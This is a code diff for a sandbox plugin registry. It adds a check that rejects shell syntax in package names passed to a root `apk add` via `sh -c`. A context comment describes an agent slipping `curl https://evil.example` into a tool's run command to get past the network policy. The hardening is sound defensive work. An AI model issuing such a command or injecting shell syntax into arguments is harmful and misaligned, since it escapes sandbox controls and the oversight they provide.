@@ -151,6 +151,16 @@ public enum SandboxPluginRegistration {
             )
         }
 
+        // Alpine package atoms are interpolated into root `apk add` via
+        // `sh -c`. Reject shell syntax / option forms before the plugin
+        // is staged, persisted, or installed.
+        let depErrors = plugin.validateDependencies()
+        if !depErrors.isEmpty {
+            throw SandboxPluginRegistrationError.invalidArgs(
+                depErrors.joined(separator: "; ")
+            )
+        }
+
         // Setup, per-tool `run`, and daemon commands all ride the same
         // network policy. Without this, an agent could put
         // `curl https://evil.example` directly into a tool's `run` and
